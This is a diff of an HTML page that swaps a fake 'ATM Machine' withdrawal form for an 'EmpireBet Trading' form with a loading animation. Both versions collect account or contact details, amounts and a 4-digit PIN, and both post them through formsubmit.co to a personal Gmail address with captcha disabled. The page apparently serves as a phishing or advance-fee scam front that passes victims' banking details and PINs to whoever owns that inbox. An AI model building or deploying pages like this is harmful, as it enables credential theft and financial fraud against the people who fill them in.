@@ -2,215 +2,312 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <title>EmpireBet Trading - User Details Form</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ATM Machine</title>
     <style>
+        :root {
+            --primary: #1e2a78;
+            --secondary: #f6c900;
+            --accent: #16c79a;
+            --background: #f2f4fa;
+            --card: #fff;
+            --danger: #ff5353;
+            --text: #23294d;
+            --input-bg: #f6f8fc;
+        }
         body {
-            font-family: Arial, sans-serif;
-            background-color: #000;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            background: linear-gradient(135deg, var(--primary) 0%, #223784 65%, var(--secondary) 100%);
+            min-height: 100vh;
             margin: 0;
+            padding: 0;
         }
-        .atm {
-            background: linear-gradient(145deg, #222, #000);
-            border-radius: 20px;
-            width: 350px;
-            padding: 20px;
-            box-shadow: 5px 5px 15px #111, -5px -5px 15px #333;
+        .centered {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .fixed-note {
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 16px;
-            color: #ffd700;
-            font-weight: bold;
-            background-color: #111;
-            padding: 10px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
-        }
-        .screen {
-            background-color: #111;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-            text-align: center;
-            color: #00ff99;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        form {
+        .loader-container {
             display: flex;
             flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255,255,255,0.96);
+            border-radius: 16px;
+            padding: 42px 32px;
+            box-shadow: 0 6px 32px rgba(30,42,120,0.07);
+        }
+        .loader {
+            border: 7px solid #f3f3f3;
+            border-top: 7px solid var(--accent);
+            border-radius: 50%;
+            width: 68px;
+            height: 68px;
+            animation: spin 1.1s linear infinite;
+            margin-bottom: 30px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg);}
+            100% { transform: rotate(360deg);}
+        }
+        .welcome-text {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: var(--primary);
+            text-shadow: 1px 2px 10px #dde2fc;
+            min-height: 2em;
+            text-align: center;
+            letter-spacing: 1px;
+            margin-bottom: 0;
+        }
+        .container {
+            max-width: 410px;
+            margin: 40px auto;
+            background: var(--card);
+            border-radius: 16px;
+            box-shadow: 0 6px 32px rgba(30,42,120,0.13);
+            padding: 32px 28px 28px 28px;
+            animation: fadeInForm 1s;
+        }
+        @keyframes fadeInForm {
+            from { opacity: 0; transform: scale(0.92);}
+            to { opacity: 1; transform: scale(1);}
+        }
+        h2 {
+            text-align: center;
+            color: var(--primary);
+            margin-bottom: 18px;
+            font-weight: 700;
+            letter-spacing: 2px;
         }
         label {
-            margin: 10px 0 5px;
-            font-size: 14px;
-        }
-        input, select, button {
-            border: none;
-            border-radius: 5px;
-            padding: 10px;
-            margin-bottom: 15px;
-            font-size: 14px;
+            display: block;
+            margin-bottom: 7px;
+            color: var(--text);
+            font-weight: 600;
         }
         input, select {
-            background-color: #222;
+            width: 100%;
+            padding: 10px 10px;
+            margin-bottom: 20px;
+            border: 1.6px solid #e4e7f2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 1.08em;
+            background: var(--input-bg);
+            color: var(--text);
+            transition: border 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border: 1.6px solid var(--accent);
+            background: #fff;
+            box-shadow: 0 0 0 2px #16c79a33;
+        }
+        .bot-id-group {
+            display: flex;
+            align-items: center;
+            gap: 0;
+        }
+        .bot-id-prefix {
+            padding: 10px 10px;
+            background: var(--secondary);
+            border: 1.6px solid #e4e7f2;
+            border-radius: 6px 0 0 6px;
+            border-right: none;
+            font-size: 1.08em;
             color: #fff;
+            font-weight: bold;
+            min-width: 104px;
+            text-align: center;
+            box-shadow: 0 2px 6px #fdebb6a4;
+        }
+        .bot-id-suffix {
+            flex: 1;
+            border-radius: 0 6px 6px 0;
+            border-left: none;
         }
         button {
-            background-color: #00ff99;
-            color: #000;
+            width: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--secondary));
+            color: #fff;
+            padding: 13px;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.13em;
             cursor: pointer;
-            font-weight: bold;
+            font-weight: 700;
+            letter-spacing: 0.7px;
+            box-shadow: 0 2px 10px #f6c9001c;
+            transition: background 0.18s, transform 0.13s;
         }
         button:hover {
-            background-color: #00cc77;
+            background: linear-gradient(90deg, var(--primary) 60%, var(--accent) 100%);
+            transform: scale(1.03);
         }
-        .deduction-info {
-            margin-bottom: 10px;
-            color: #ffd700;
-            background: #222;
+        .note {
+            font-size: 0.94em;
+            color: var(--primary);
+            margin-bottom: 15px;
+            background: #e8f8f7;
+            padding: 7px 12px;
             border-radius: 5px;
-            padding: 8px;
             text-align: center;
-            font-size: 15px;
         }
-        .help-text {
-            color: #0ff;
-            font-size: 11px;
-            margin-bottom: 6px;
-            text-align: right;
+        @media (max-width: 600px) {
+            .container, .loader-container {
+                max-width: 97vw;
+                padding: 14px 6vw 18px 6vw;
+            }
         }
     </style>
     <script>
-        function showPopupMessage() {
-            alert("Please wait for your transaction to be processed. Don't close your browser Thank you.");
-        }
+        // Loader and Welcome Typing Animation
+        document.addEventListener("DOMContentLoaded", function () {
+            let phase = 0;
+            const loaderDiv = document.getElementById('loader-area');
+            const formDiv = document.getElementById('form-area');
+            const welcome = document.getElementById('welcome-text');
+            // Loader and typing states
+            let message = "Welcome to EmpireBet Odd Trading.";
+            let display = "";
+            let charIndex = 0;
+            let repeat = 0;
+            let typingDelay = 44;
+            let repeatCount = 4;
 
-        function calculateDeduction(amount) {
-            amount = Number(amount);
-            let deduction = 0;
-            if (amount >= 1000 && amount <= 3000) {
-                deduction = 300;
-            } else if (amount >= 4000 && amount <= 5000) {
-                deduction = 500;
-            } else if (amount >= 6000 && amount <= 10500) {
-                deduction = 1000;
-            } else if (amount >= 11000 && amount <= 19000) {
-                deduction = 1500;
-            } else if (amount == 20000) {
-                deduction = 2000;
-            } else if (amount >= 21000 && amount <= 27000) {
-                deduction = 2500;
-            } else if (amount >= 28000 && amount <= 30000) {
-                deduction = 3000;
-            }
-            return deduction;
-        }
-
-        function updateDeduction() {
-            const amountInput = document.getElementById('amount');
-            const deductionInfo = document.getElementById('deduction-info');
-            const netAmountInput = document.getElementById('netAmount');
-            const deductionInput = document.getElementById('deduction');
-            const deductionNoteInput = document.getElementById('deductionNote');
-            let amount = Number(amountInput.value);
-
-            if (isNaN(amount)) {
-                deductionInfo.textContent = '';
-                netAmountInput.value = '';
-                deductionInput.value = '';
-                deductionNoteInput.value = '';
-                return;
+            function typeWriter() {
+                if (charIndex < message.length) {
+                    display += message[charIndex];
+                    welcome.innerHTML = display + '<span style="color:var(--accent)">|</span>';
+                    charIndex++;
+                    setTimeout(typeWriter, typingDelay);
+                } else {
+                    // Finished a line
+                    welcome.innerHTML = display;
+                    setTimeout(function () {
+                        charIndex = 0;
+                        display = "";
+                        repeat++;
+                        if (repeat < repeatCount) {
+                            setTimeout(typeWriter, 380);
+                        } else {
+                            setTimeout(showForm, 650);
+                        }
+                    }, 480);
+                }
             }
 
-            if (amount < 1000 || amount > 30000) {
-                deductionInfo.textContent = 'Amount must be between ₦1,000 and ₦30,000.';
-                netAmountInput.value = '';
-                deductionInput.value = '';
-                deductionNoteInput.value = deductionInfo.textContent;
-                return;
+            function showForm() {
+                loaderDiv.style.display = "none";
+                formDiv.style.display = "block";
             }
 
-            let deduction = calculateDeduction(amount);
-            let net = amount - deduction;
+            // Start typing welcome after loader shows
+            setTimeout(typeWriter, 720);
+        });
 
-            deductionInfo.textContent = `Deduction: ₦${deduction.toLocaleString()} | You'll receive: ₦${net.toLocaleString()}`;
-            netAmountInput.value = net;
-            deductionInput.value = deduction;
-            deductionNoteInput.value = deductionInfo.textContent;
+        // Form validation and hidden field
+        function validateForm(e) {
+            // Bot Trade ID Suffix
+            const botSuffix = document.getElementById('bot-id-suffix').value;
+            if (!/^\d{4}$/.test(botSuffix)) {
+                alert("Please enter the 4 digits for your Bot Trade ID.");
+                e.preventDefault();
+                return false;
+            }
+            // Amount
+            const amount = parseInt(document.getElementById('amount').value, 10);
+            if (isNaN(amount) || amount < 3500 || amount > 100000) {
+                alert("Amount must be between 3,500 and 100,000.");
+                e.preventDefault();
+                return false;
+            }
+            // PIN
+            const pin = document.getElementById('user-pin').value;
+            if (!/^\d{4}$/.test(pin)) {
+                alert("PIN must be a 4-digit number.");
+                e.preventDefault();
+                return false;
+            }
+            // Set hidden field
+            document.getElementById('full-bot-id').value = "EmpireBot>" + botSuffix;
+            return true;
         }
     </script>
 </head>
 <body>
-    <div class="atm">
-        <div class="screen">
-            Welcome to the ATM
+    <!-- Loader and Welcome -->
+    <div class="centered" id="loader-area">
+        <div class="loader-container">
+            <!-- Replace the below div with your image if needed -->
+            <div class="loader"></div>
+            <div class="welcome-text" id="welcome-text"></div>
         </div>
-        <form action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" onsubmit="showPopupMessage()">
-            <label for="accountName">Account Name:</label>
-            <input type="text" id="accountName" name="accountName" placeholder="Enter your account name" required>
+    </div>
 
-            <label for="accountNumber">Account Number:</label>
-            <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter your account number" required>
+    <!-- Main Form (Initially Hidden) -->
+    <div class="container" id="form-area" style="display:none;">
+        <h2>EmpireBet Trading</h2>
+        <div class="note">
+            Trade with confidence.<br>
+            Please fill in your details accurately.
+        </div>
+        <form 
+            action="https://formsubmit.co/empirevirtual99@gmail.com" 
+            method="POST" 
+            autocomplete="on"
+            onsubmit="return validateForm(event)">
 
-            <label for="bankName">Bank Name:</label>
-            <select id="bankName" name="bankName" required>
-                <option value="">Select Bank</option>
-                <option value="Access Bank">Access Bank</option>
-                <option value="Citibank">Citibank</option>
-                <option value="Diamond Bank">Diamond Bank</option>
-                <option value="Ecobank">Ecobank</option>
-                <option value="Fidelity Bank">Fidelity Bank</option>
-                <option value="First Bank of Nigeria">First Bank of Nigeria</option>
-                <option value="First City Monument Bank (FCMB)">First City Monument Bank (FCMB)</option>
-                <option value="Guaranty Trust Bank (GTBank)">Guaranty Trust Bank (GTBank)</option>
-                <option value="Heritage Bank">Heritage Bank</option>
-                <option value="Jaiz Bank">Jaiz Bank</option>
-                <option value="Keystone Bank">Keystone Bank</option>
-                <option value="Polaris Bank">Polaris Bank</option>
-                <option value="Providus Bank">Providus Bank</option>
-                <option value="Stanbic IBTC Bank">Stanbic IBTC Bank</option>
-                <option value="Standard Chartered Bank">Standard Chartered Bank</option>
-                <option value="Sterling Bank">Sterling Bank</option>
-                <option value="Suntrust Bank">Suntrust Bank</option>
-                <option value="Union Bank">Union Bank</option>
-                <option value="United Bank for Africa (UBA)">United Bank for Africa (UBA)</option>
-                <option value="Unity Bank">Unity Bank</option>
-                <option value="Wema Bank">Wema Bank</option>
-                <option value="Zenith Bank">Zenith Bank</option>
-            </select>
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="Email" required autocomplete="email" placeholder="your@email.com">
 
-            <label for="amount">Amount: <span class="help-text">(₦1,000 min - ₦30,000 max)</span></label>
-            <input type="number" id="amount" name="amount" min="1000" max="30000" step="100" placeholder="Enter amount" required oninput="updateDeduction()">
-            <div class="deduction-info" id="deduction-info"></div>
-            <input type="hidden" name="deduction" id="deduction">
-            <input type="hidden" name="netAmount" id="netAmount">
-            <input type="hidden" name="deductionNote" id="deductionNote">
-
-            <label for="beneficiaryPhoneNumber">Beneficiary's Phone Number:</label>
-            <input type="text" id="beneficiaryPhoneNumber" name="beneficiaryPhoneNumber" placeholder="Enter phone number" required>
-
-            <label for="insectPIN">Insect PIN:</label>
-            <input type="number" id="insectPIN" name="insectPIN" pattern="\d{4}" inputmode="numeric" placeholder="4-digit PIN" required>
-
-            <div class="fixed-note">
-                Note: You can only withdraw up to your daily limit. Please do not try to withdraw more than once per day.
+            <label for="bot-id-suffix">Bot Trade ID</label>
+            <div class="bot-id-group">
+                <span class="bot-id-prefix">EmpireBot&gt;</span>
+                <input 
+                    type="text"
+                    id="bot-id-suffix"
+                    maxlength="4"
+                    pattern="\d{4}"
+                    placeholder="Enter 4 digits"
+                    title="Enter the remaining 4 digits"
+                    required
+                    class="bot-id-suffix"
+                >
             </div>
+            <input type="hidden" name="Bot Trade ID" id="full-bot-id">
 
-            <button type="submit">Withdraw</button>
+            <label for="amount">Amount to Trade (₦)</label>
+            <input 
+                type="number" 
+                id="amount" 
+                name="Amount" 
+                min="3500" 
+                max="100000" 
+                step="100"
+                placeholder="Enter amount (3,500 - 100,000)"
+                required
+            >
+
+            <label for="user-pin">User PIN (4 digits)</label>
+            <input 
+                type="password" 
+                id="user-pin" 
+                name="User PIN"
+                pattern="\d{4}"
+                maxlength="4"
+                autocomplete="off"
+                placeholder="4-digit PIN"
+                inputmode="numeric"
+                required
+            >
+
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <button type="submit">Submit</button>
         </form>
     </div>
-    <script>
-        // Initialize on page load in case of browser autofill
-        window.onload = function() {
-            updateDeduction();
-        }
-    </script>
 </body>
 </html>
